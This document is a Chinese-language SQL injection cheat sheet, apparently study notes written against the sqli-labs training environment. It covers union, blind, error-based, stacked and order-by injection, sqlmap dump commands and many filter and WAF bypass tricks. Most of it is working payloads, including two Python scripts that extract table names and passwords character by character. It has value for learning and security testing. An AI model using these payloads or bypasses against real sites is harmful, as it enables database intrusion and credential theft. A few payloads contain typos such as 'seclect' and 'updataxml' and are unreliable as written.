# **Sql注入**

sql注入：（注入时一定要闭合可以通过 --+来闭合，也可以通过--空格或者--%20来闭合，还有#，像我在做bugku的有道sql注入的时候用--+注释不行但是用#却可以)

```
空格的16进制为%20

0x3a时冒号的16进制

group_concat()表示连接括号里面的东西，可以把括号里的东西当成一个字符串输出

~的16进制是0x7e
```

# 联合注入

遇到一个UNION注入，我们有几个小步骤，联合查询后面语句的字段数必须要和原语句的字段数报持一致

这里我们以sql语句为select column_name from admin where id='1';且有三个字段为例(与sqli-labs的less-01一致)

### 猜字段长度

我们可以通过order by num（此时不报错）来判断一个id值有几个字段

例如：我们输入order by 3返回的结果是正确的，而order by 4则会报错这时候我们可以知道该

id值有三个字段，所以说，当我们输入order by 2也会返回正确的结果

附上语句id=1' order by num --+(基于不同的报错类型，id值会不一样,有些是id=1')

有些则为id=1 order by num --+(总之要根据不同的sql语句进行闭合前面的源代码)

### 爆字段：

 	当我们判断出有几个字段后，可以用union select来爆字段

这里我们以三个字段为例：	

首先，需要把我们的id值改一下，这里可以改为-1(这是改为一个数据库没有的id值),来报错(可以用id=1 and 1=2强制报错),从而来返回union select的内容

然后构造的语句就为：id=-1' union select 1，2，3 --+

这时候应该会返回一个结果2，3说明我们可以在2和3这两点注入,因为这两点才能返回结果

### 爆内容：

我们已经知道了可以在2和3这两点注入于是可以继续更改我们的语句为：

```
id=-1' union select 1，user（），database（）--+
```

从而带得到用户名和数据库名（有字段的地方都可以实现查询）。

### 爆表名。

附上语句

```
id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
```

### 爆字段名

附上语句

```
id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+
```

此时的users时刚才查询表名获得的其中一个表名(必须要加单引号,如果是数字可以不用）

### 获取字段值

附上语句

```
id=-1' union select 1,group_concat(username),group_concat(password) from users --+（这里不用引号）
```

或者

```
id=-1' union select 1,group_concat(username,0x3a,password),3 from users --+
```

除此之外还可以通过

```
union select 1,group_concat(schema_name),3 from information_schema.schemata --+来获得schema_name
```



### **利用sqlmap注入:**

```
python sqlmap.py -u “url” --dbs --batch

python sqlmap.py -u “url” -D security --tables --batch

python sqlmap.py -u “url” -D security -T users --columns --batch 

python sqlmap.py -u “url” -D security -T users --C “username,password” --dump --batch
```

其实我试了试，基于get方式的例如sqli-labs的1-10都可以用这种方式探测

# 盲注(Bind SQL)

之所以为盲注是因为在你构造sql语句或者其他时，页面只会返回指定结果，不会像union那样返回查询的结果

主要思路为构造sql语句如id=1' and (length(user()))等一系列语句来逐个猜解(闷头肝)

需要用到的函数

```
Length（）函数 返回字符串的长度

Substr（）截取字符串

Ascii（）返回字符的ascii码(与limit不同，limit的第一位是从0开始，而这里是从1开始的)

sleep(n)：将程序挂起一段时间 n为n秒

if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句
```

## 布尔盲注：

返回的结果只有两种，true或者false(当然也需要注释哦，亲)

 	 首先，用id=1'报错

其次，id=1' and length(database())>2来猜解数据库的长度，若返回正常的内容(即true)，这长度大于2

若id=1' and (length(database()))<3--+，返回false，可以得到数据库长度为3

在得到数据库长度后我们就可以开始对数据库名进行逐字猜解了

构造sql语句:

```
id=1' and (ascii(substr(database(),1,1)))>num --+
```

这里意思为从数据库的第一位开始截取数据库的第一位并转化为ascii码(通过ascii码我们可以知道大小写)判断（判断方法和之前一样),从而逐步得到数据库名

我们也可以通过burpsuite爆破实现数据库名的逐步猜解

在得到数据库名之后,当然就是对表名猜解了

附上语句

```
id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))>r --+

id=1' and length(database())>2

payload = "1' and (ascii(substr(database(), %d, 1))) > %d--+" % (i, mid)

payload = "1' and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), %d, 1))) > %d--+" % (i, mid)

payload = "1' and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users' limit 0,1), %d, 1))) > %d--+" % (i, mid)

payload = "1' and (ascii(substr((select password from users limit 0,1), %d, 1))) > %d--+" % (i, mid)

```

盲注脚本

```
import requests

url = "http://192.168.168.151/sqli-labs/Less-8/?id=1"

result = ""
i = 0

while (True):
    i = i + 1
    head = 32
    tail = 127

    while (head < tail):
        mid = (head + tail) // 2

        # payload = "' and (ascii(substr(database(), %d, 1))) > %d--+" % (i, mid)
        payload = "' and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), %d, 1))) > %d--+" % (i, mid)
        # payload = "' and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users' limit 0,1), %d, 1))) > %d--+" % (i, mid)
        # payload = "' and (ascii(substr((select password from users limit 0,1), %d, 1))) > %d--+" % (i, mid)

        r = requests.get(url + payload)
        r.encoding = "utf-8"
        # print(url+payload)
        if "You are in" in r.text:
            head = mid + 1
        else:
            # print(r.text)
            tail = mid

    last = result

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
```

猜解过程一样，略显无聊，但开始最好还是手工盲注练习一下，以后是可以自己写脚本的

后面猜解的思路也就是在获得表名后继续去获得字段名甚至其他

### **利用sqlmap注入:**

其中的technique选择的sql注入技术（BESUTQ）

B:布尔盲注

E:报错注入

U:联合注入

T:时间盲注

Q:查询

S:堆叠查询

```
python sqlmap.py -u “url” (--technique B) --dbs --batch

python sqlmap.py -u “url” --technique B -D security --tables --batch

python sqlmap.py -u “url” --technique B -D security -T users --columns --batch

python sqlmap.py -u “url” --technique B -D security -T users --C “username,password” --dump --batch

```

## 基于时间的盲注

思路其实和布尔盲注相差无几，只不过页面返回结果只有ture这一种形式，但是我们可以通过服务器的反应时间来判断

所以通过sql语句:id=1' and if(length(database())>1,sleep(5),1)--+

这段代码意思为，如果数据库名的长度大于1，则mysql休眠5s，否则查询1的结果，用这种方法来判断，猜解字符从而达到获取库名，表名，字段名

```
id=1' and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))>1,sleep(5),1)--+
```

为了方便查看相应时间我们可以通过burp

```
payload = "' and if((ascii(substr(database(), %d, 1))) > %d,sleep(3),1)--+" % (i, mid)

payload = "' and if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), %d, 1))) > %d,sleep(3),1)--+" % (i, mid)

payload = "' and if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users' limit 0,1), %d, 1))) > %d,sleep(3),1)--+" % (i, mid)

payload = "' and if((ascii(substr((select password from users limit 0,1), %d, 1))) > %d,sleep(3),1)--+" % (i, mid)

```

盲注脚本

```
import requests

url = "http://192.168.168.151/sqli-labs/Less-8/?id=1"

result = ""
i = 0

while (True):
    i = i + 1
    head = 32
    tail = 127

    while (head < tail):
        mid = (head + tail) // 2

        payload = "' and if((ascii(substr(database(), %d, 1))) > %d,sleep(3),1)--+" % (i, mid)
        # payload = "' and if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), %d, 1))) > %d,sleep(3),1)--+" % (i, mid)
        # payload = "' and if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users' limit 0,1), %d, 1))) > %d,sleep(3),1)--+" % (i, mid)
        # payload = "' and if((ascii(substr((select password from users limit 0,1), %d, 1))) > %d,sleep(3),1)--+" % (i, mid)

        try:
            r = requests.get(url+payload,timeout=1.5)
            tail = mid
        except:
            head = mid + 1

    last = result

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
```

### **利用sqlmap注入:**

```
python sqlmap.py -u “url” (--technique T) --dbs --batch

python sqlmap.py -u “url” --technique T -D security --tables --batch

python sqlmap.py -u “url” --technique T -D security -T users --columns --batch

python sqlmap.py -u “url” --technique T -D security -T users -C “username,password” --dump --batch
```

# 报错注入

SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。

可能会用到的函数

```
1. concat： 连接字符串功能

2. floor()： 取float的整数值  (向下取整）

3. rand()： 取0~1之间的随机浮点值,rand(0)是伪随机的

4. group by： 根据一个或多个列对结果集进行分组并有排序功能

5. floor(rand(0)*2)： 随机产生0或1
```

group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，

由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。

​	(1) 在输入id值不会查询带数据库内容，但是id=1'时有报错信息，可以初步判断这是一个报错注入

​	(2) 与union一样，我们上来先order by这里以三个字段为例

​	(3) 然后对id值进行报错获得数据库名  (由于报错注入只显示一条结果，所以需要用limit语句)

​		附上语句:

```
id=0' union select 1,2,3 from(select count(*),concat((select concat(version(),0x3a,database(),0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a--+
```

​		或者

```
id=' and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
```

​		或者

```
id=' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
```

​		或者

```
id=' and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+
```

​		或者

```
id=' and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1)--+
```

​	(4)对表名的获取

​		附上语句:

```
id=0' union select 1,2,3 from (select count(*),concat((select concat(table_name,0x3a) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a--+
```

​		或者

```
id=' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)--+
```

​	(5)字段名的获取

​		附上语句:

```
id=0' union select 1,2,3 from (select count(*),concat((seclect concat(column_name,0x3a) from information_schema.columns where table_name='users' limit 0,1),floor(rand(0)*2))x from information_schema.columns group by x)a--+
```

​		或者

```
id=' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e),1)--+
```

​	(6)字段值的获取

​		附上语句:

```
id=0' union select 1,2,3 from (select count(*),concat((select concat(username,0x3a,password,0x3a) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a--+
```

​		或者

```
id=' and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1)--+
```

​	注:如果用updatexml函数和extrctvalue函数的话，密码长度超过32位不会被显示出来，最长为32位

此时可以将它取反，或者单独用left，mid，right函数

```
password=' or updatexml('',concat('~',reverse((select Fl4g from Flag))),'')%23
```

```
id=' and updatexml(1,concat(0x7e,left((select database()),3),0x7e),1)--+

取最左边三位
```



### **利用sqlmap注入:**

```
python sqlmap.py -u “url” --dbs --batch

python sqlmap.py -u “url” -D security --tables --batch

python sqlmap.py -u “url” -D security -T users --columns --batch 

python sqlmap.py -u “url” -D security -T users --C “username,password” --dump --batch
```

 

# 堆叠注入

​	原理:根据sql中用分号将多语句分开，利用这一特点，我们可以在第二个sql语句中构造自己要执行的语句。

​	语句效果展示

​	

```
mysql> select * from users where id=1;select user();

+----+----------+----------+

| id | username | password |

+----+----------+----------+

|  1 | test   | Dumb   |

+----+----------+----------+

1 row in set (0.00 sec)

 

+----------------+

| user()     |

+----------------+

| root@localhost |

+----------------+

1 row in set (0.00 sec)
```

​	首先，依然是老办法id=1'或者其他的使数据库报错

​		sql语句:id=';select if(substr(user(),1,1)='r',sleep(3),1)#

​		这里后面构造的语句就根据自己需要了，有时候也要通过盲注的手段.

# 	基于post的注入

和GET方式无异无非是传参的地方不同而已

### 	**利用Sqlmap注入（less-11）**

可以用submit时用burp抓包，将http请求包写入一个txt文件1.txt中，将1.txt放入sqlmap根目录

```
python sqlmap.py -r 1.txt -p passwd --technique E -current-db --batch

python sqlmap.py -r 1.txt -p passwd --technique E -D security --tables --batch

python sqlmap.py -r 1.txt -p passwd --technique E -D security -T users --columns --batch

python sqlmap.py -r 1.txt -p passwd --technique E -D security -T users -C “username,password” --dump --batch
```

# limit注入

要求MySQL版本低于5.6

在limit后面是可以跟procedure analyse()这个子查询的

而且只能用extractvalue 和 benchmark 函数进行延时

当sql语句为

```
select * from admin order by id limit 0,1
```

此时因为order by而不是`where id ='id'`，`order by` 后面是不可以用union的,所以就不能使用联合查询

用以下报错注入

```
select * from admin order by id limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3e,version())),1);
```

![image-20210803102526593](images/1.png)可以报出我数据库的版本

其他的注入就和报错注入一样了

# order by注入

假如一条sql语句是

```
select * from admin order by id='id';
```

payload:

```
时间盲注:
select * from admin order by if(1=1,1,sleep(1)); #正常时间
select * from admin order by if(1=2,1,sleep(1)); #有延迟
同样的，我们可以在上面的payload中替换我们想要的语句
比如：
order by if((select ascii(substr(table_name,1,1)) from information_schema.tables limit 1)<=128,1,sleep(1))
```

```
基于rand()的盲注
当rand()里面为true和false的时候,数据库的排序是不同的,所以我们可以通过rand()里面语句的真假来进行盲注

order by rand(ascii(mid((select database()),1,1))>96)
```

![image-20210803130245324](images/2.png)

```
order by后的报错注入
select * from admin order by updataxml(1,concat(0x7e,database(),0x7e),1);
```



# SQL注入ByPass

## 空格过滤

常见的绕过空格过滤的方法

```
%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/，括号
```

 ![image-20210725103650668](images/3.png)

除此之外,用括号也可以绕过空格过滤,但是仅包含计算出来的语句

在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。

也可以用反引号进行绕过,和括号使用方法一样

例如

```
?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23
?id=' and select(user())from test where(1=1)and(2=2)
```

 例如sqli-labs26就是用括号来绕过空格的

```
payload:
http://127.0.0.1/sqli-labs/Less-26/?id=1'oorr(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),0x7e)))aandnd'1'='1
```

##  利用16进制绕过引号过滤

在where语句中经常是要用到引号的

例如

```
select column_name  from information_schema.tables where table_name="users"
```

当引号被过滤后就不能这样使用了,但是我们可以将users转化为16进制进行绕过

users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：

```sql
select column_name  from information_schema.tables where table_name=0x7573657273
```

 information_schema的16进制为696e666f726d6174696f6e5f736368656d61

![image-20210725110248696](images/4.png)

##  逗号过滤

例如substr,mid,limit等诸多函数,与逗号的使用密不可分

substr和mid的逗号过滤了可以用from for代替,并且from for用使用括号来绕过空格上面利用括号绕过空格过滤已经演示了

![image-20210725112906301](images/5.png)

 ![image-20210725113155422](images/6.png)

limit的都逗号被过滤了可以使用offset进行绕过

![image-20210725113334027](images/7.png)

注意一下,用offset的时候0与1是反过来的

select 1,2,3之类的中间的逗号可以用join来绕过

![image-20210725113628028](images/8.png)

```
1. union select 1,2     *#等价于*
2. union select * from (select 1)a join (select 2)b
```

但是注意使用join的时候必须要给他重命名像上面的(select 1)a不加这个a会报错

## 过滤比较符号<>

在sql盲注的时候经常要比较ASCII码值的大小来猜解,但是当比较符号被过滤后,我们是不是就不能猜解了啊

当然不是,方法还是多的我们可以用函数来代替

```
greatest()//返回最大值
least()//返回最小值
```

```
select * from users where id=1 and ascii(substr(database(),1,1))>64
这条语句当比较符号被过滤后可以用以下语句替代
select * from users where id=1 and greatest(ascii(substr(database(),1,1)),64)=64
```

 ![image-20210726130924600](images/9.png)

除此之外还可以用between

 ![image-20210726131910268](images/10.png)

## 过滤=

可以发现,上面的between其实也可以绕过等号,其实`between 1 and 1就等价于=1`

除此之外还可以用regexp,like,rlike进行绕过,或者结合使用<和>,

![image-20210726133202550](images/11.png)

如下图

![image-20210726133329509](images/12.png)

可以判断第一位的ASCII码就是116

## or,and，xor绕过

```
and=&&  
or=||   
xor=|   
not=!
```

##  绕过注释符

有时候做题的话,他会把--+,#这些全部过滤了,我们就无法使用注释符了

但是我们可以才用闭合的方式

假如一条语句的闭合方式为单引号

正常情况下语句应该是

```
id=1' union select 1,2#
```

但是当注释符被过滤了的时候就可以用如下语句代替

```
id=1' union select 1,2 or '1
```

这样来闭合后面的单引号

或者

```
id=1' union select 1,'2
```

## 绕过对union,select,or,and,where等的过滤

### 大小写绕过

```
UnIOn,SeLEcT,OR,And,WhEre
```

### 双写绕过

这种方法只针对那种检测到代码删除第一个匹配到的才可以

```
UnunionIOn,SeLselectEcT,OorR,Anandd,WhwhereEre
```

### 注释符绕过

常用注释符：

```sql
//，-- , /**/, #, --+, -- -, ;,%00,--a
```

用法：

```sql
U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user
```

### 内联注释绕过

```
/*!select*/
```

![image-20210726135107240](images/13.png)

## 编码绕过

有时候我们可以将语句编码,用urlencode,hex,ascii,unicode编码进行绕过

由于服务器会自动对url进行一次解码,所以我们在进行url编码的时候需要把关键词编码两次，这里需要注意的地方是，URL编码需选择全编码，而不是普通的URL编码

```
test也可以是CHAR(116)+CHAR(97)+CHAR(115)+CHAR(116)来代替
or 1=1即%6f%72%20%31%3d%31
```

## 等价函数绕过

```
hex()//16进制、bin()//二进制 
ord() ==> ascii()
sleep() ==>benchmark()
concat_ws()==>group_concat()
mid()、substr() ==> substring()
@@user ==> user()
@@datadir ==> datadir()
left(str,length)返回length左边的字符
rigth()与left相反
strcmp()相同返回0,大于返回1,小于返回-1
```

![image-20210727010147116](images/14.png)

![image-20210727010737979](images/15.png)

![image-20210727011725067](images/16.png)

## 宽字节注入

当`'`被过滤的时候一般都是用`addslashes()`将单引号转义为`\'`

而`\'`的url编码是`%5c%27`

当mysql的编码方式是GBK编码的时候,`%df%5c`是一个汉字，这样就会将/吃掉，就可以逃逸掉单引号

例如代码

```
id=1%df%27 union select 1,database()#
```

防御此漏洞，要将 mysql_query 设置为 binary 的方式

## 多参数请求拆分绕过

对于多个参数拼接到同一条SQL语句中的情况，可以将注入语句分割插入。

例如请求URL时，GET参数格式如下：

```
a=[input1]&b=[input2]
```

将GET的参数a和参数b拼接到SQL语句中，SQL语句如下所示。

```
and a=[input1] and b=[input2]
```

这时就可以将注入语句进行拆分，如下所示：

```
a=union/*&b=*/select 1,2,3,4
```

最终将参数a和参数b拼接，得到的SQL语句如下所示：

```
and a=union /*and b=*/select 1,2,3,4
```

这样中间的部分就被注释掉了,就执行了sql语句

## HTTP参数污染

当在服务器中一个参数出现多次的情况下,web中间件为将其解析出不同的结果(a=1&a=2)

在网上扒了个图

![img](https://img-blog.csdnimg.cn/20190106130518949.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2wxMDI4Mzg2ODA0,size_16,color_FFFFFF,t_70)

当中间件时IIS的时,所以参数值会用逗号连接,那我如果刚好将这里的逗号注释掉,是不是就可以进行sql攻击了

如果我们想执行的sql语句是这样的

```
a=union select 1,2,3,4
```

将SQL注入语句转换为以下格式。

```
a=union/*&a=*/select/*&a=*/1&a=2&a=3&a=4
```

最终在IIS中读取的参数值将如下所示

```
a=union/*, */select/*, */1,2,3,4
```

可以看到中间参数连接的地方会被转化为逗号，然后经过注释符的作用,得到了与我们想执行的SQL语句一样的结果

## 生僻函数绕过

在报错注入中`updatexml,extractvalue,floor`只是常用的方法,当然还是有生僻函数可以代替他们的

就像在报错注入中使用polygon()函数替换常用的updatexml()函数

总共的报错注入方式是有12种的

## HTTP请求包注入

有些时候对cookie和user-agent检测不严格的话,可以将注入点放在cookie或者user-agent中

## 无列名注入

之前我们的注入方式都离不开information_schema这个数据库,但是waf过滤了这个数据库怎么办

在我们进行sql注入的时候，有时候information_schema这个库可能会因为过滤而无法调用，这时我们就不能通过这个库来查出表名和列名。不过我们可以通过两种方法来查出表名：

```
InnoDb引擎
从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。
```

```
sys数据库
在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名。
```

但是上述两种方法都只能查出表名，无法查到列名，这时我们就要用到无列名注入了。无列名注入，顾名思义，就是不需要列名就能注出数据的注入

payload

用innodb绕过的话

```
id=-1' union select 1,2,group_concat(table_name) from mysql.innodb_table_stats where database_name=database()#
```

用sys库绕过

```
id=-1' union all select 1,2,group_concat(table_name) from sys.schema_auto_increment_columns where table_schema=database()--+
```

![image-20210727123824426](images/17.png)

可以看到我admin表是有3列的,分别是id,user,password

如果我想查询第二列的内容,但是我不知道列名，我就需要构建一个虚拟表,同时查询其中的数据

payload:

```
select `2` from (select 1,2,3 union select * from admin)n;
前面的`2`是查询的第二列,必须要加反引号,最后的n是别名也需要加
```

当然反引号被过滤的情况也是不少的,当反引号被过滤了又需要去取别名了

![image-20210727124359738](images/18.png)

将1,2,3分别令为a,b,c这样就可以在查询第二列的时候用b替代,而不加反引号了

### 无列名盲注

前面还是一样的，但是后面查表的的操作不太一样



参考链接：https://blog.csdn.net/weixin_46330722/article/details/109605941

参考链接：https://blog.csdn.net/l1028386804/article/details/85869703

```
payload = "' and (ascii(substr(database(), %d, 1))) > %d--+" % (i, mid)
# payload = "' and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), %d, 1))) > %d--+" % (i, mid)
# payload = "' and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users' limit 0,1), %d, 1))) > %d--+" % (i, mid)
# payload = "' and (ascii(substr((select password from users limit 0,1), %d, 1))) > %d--+" % (i, mid)
```
